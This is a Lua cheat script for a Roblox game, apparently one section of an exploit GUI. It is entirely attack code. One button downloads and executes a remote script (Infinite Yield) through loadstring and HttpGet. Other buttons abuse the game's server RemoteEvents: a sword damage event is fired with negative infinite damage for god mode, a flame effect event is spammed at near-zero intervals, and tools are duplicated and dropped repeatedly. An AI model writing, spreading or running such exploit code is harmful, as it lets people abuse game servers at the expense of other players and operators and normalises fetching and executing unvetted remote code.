if main and type(main.Button) == "function" then
    main:Button("Infinite Yield", function()
        local url = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"
        pcall(function()
            loadstring(game:HttpGet(url, true))()
        end)
    end)
end

-- WalkSpeed and JumpPower Sliders/Buttons
if sldrs and type(sldrs.Slider) == "function" then
    local wsValue, jpValue = 16, 50
    local function setWalkSpeed(speed)
        wsValue = speed
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then humanoid.WalkSpeed = speed end
    end
    local function setJumpPower(jump)
        jpValue = jump
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then humanoid.JumpPower = jump end
    end
    sldrs:Slider("Walkspeed Modifier", 0, 1000, wsValue, setWalkSpeed)
    sldrs:Slider("Jump Power Modifier", 0, 1000, jpValue, setJumpPower)
    sldrs:Button("WalkSpeed +10", function() setWalkSpeed(wsValue + 10) end)
    sldrs:Button("WalkSpeed -10", function() setWalkSpeed(math.max(0, wsValue - 10)) end)
    sldrs:Button("JumpPower +10", function() setJumpPower(jpValue + 10) end)
    sldrs:Button("JumpPower -10", function() setJumpPower(math.max(0, jpValue - 10)) end)
    sldrs:Button("Reset WalkSpeed", function() setWalkSpeed(16) end)
    sldrs:Button("Reset JumpPower", function() setJumpPower(50) end)
    -- Respawn Button
    sldrs:Button("Force Respawn", function()
        local plr = game.Players.LocalPlayer
        local character = plr.Character
        if not (character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid")) then return end
        local pos = character.HumanoidRootPart.CFrame
        local humanoid = character.Humanoid
        humanoid.Health = 0
        task.wait(0.2)
        if plr.Character and plr.Character.Parent then plr.Character:Destroy() end
        local newChar = plr.CharacterAdded:Wait()
        task.wait(0.1)
        local hrp = newChar:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.CFrame = pos end
    end)
    -- God Mode Button
    sldrs:Button("Instant GodMode", function()
        local plr = game.Players.LocalPlayer
        local character = plr.Character or plr.CharacterAdded:Wait()
        local humanoid = character and character:FindFirstChild("Humanoid")
        if humanoid then
            local sword = plr.Backpack:FindFirstChild("sword") or character:FindFirstChild("sword")
            if sword and sword:FindFirstChild("Handle") then
                local dmg = sword.Handle:FindFirstChild("dmg")
                if dmg then
                    local remoteEvent = dmg:FindFirstChild("RemoteEvent")
                    if remoteEvent then
                        remoteEvent:FireServer(humanoid, -math.huge)
                    end
                end
            end
        end
    end)
    -- Permagod Toggle
    sldrs:Button("Toggle Permagod", function()
        local plr = game.Players.LocalPlayer
        _G.permaGodActive = not _G.permaGodActive
        if _G.permaGodActive then
            task.spawn(function()
                while _G.permaGodActive do
                    local character = plr.Character or plr.CharacterAdded:Wait()
                    local humanoid = character and character:FindFirstChild("Humanoid")
                    local sword = plr.Backpack:FindFirstChild("sword") or character:FindFirstChild("sword")
                    if humanoid and sword and sword:FindFirstChild("Handle") then
                        local dmg = sword.Handle:FindFirstChild("dmg")
                        if dmg then
                            local remoteEvent = dmg:FindFirstChild("RemoteEvent")
                            if remoteEvent then
                                remoteEvent:FireServer(humanoid, -math.huge)
                            end
                        end
                    end
                    task.wait(1)
                end
            end)
        end
    end)
end

-- Flame Colors Function
local function applyFlameColors(colors, repeatCount)
    local eff = workspace:FindFirstChild("eff")
    if not eff then return end
    local event = eff:FindFirstChild("RemoteEvent")
    if not event then return end
    for _ = 1, repeatCount do
        for _, color in ipairs(colors) do
            event:FireServer(color)
            task.wait(0.0001)
        end
    end
end

-- Spawn and drop tools
local function spawnAndDropTools()
    local player = game.Players.LocalPlayer
    if not player then return end
    workspace.load.RemoteEvent:FireServer()
    task.wait(0.26)
    for _, tool in pairs(player.Backpack:GetChildren()) do
        if tool:IsA("Tool") then tool.Parent = player.Character end
    end
    for _, tool in pairs(player.Character:GetChildren()) do
        if tool:IsA("Tool") then
            tool.Parent = workspace
            local tag = Instance.new("StringValue")
            tag.Name = "MineYesMine"
            tag.Parent = tool
        end
    end
end

-- Cleanup tagged tools
local function cleanUpTags()
    for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        local tag = tool:FindFirstChild("MineYesMine")
        if tag then tag:Destroy() end
    end
end

-- UI Button for flame effects
local function flameEffectButton(label, colors, colorLoops, effectLoops)
    if not effects or type(effects.Button) ~= "function" then return end
    effects:Button(label, function()
        for _ = 1, effectLoops do
            applyFlameColors(colors, colorLoops)
            task.wait(0.00001)
            spawnAndDropTools()
        end
        cleanUpTags()
    end)
end

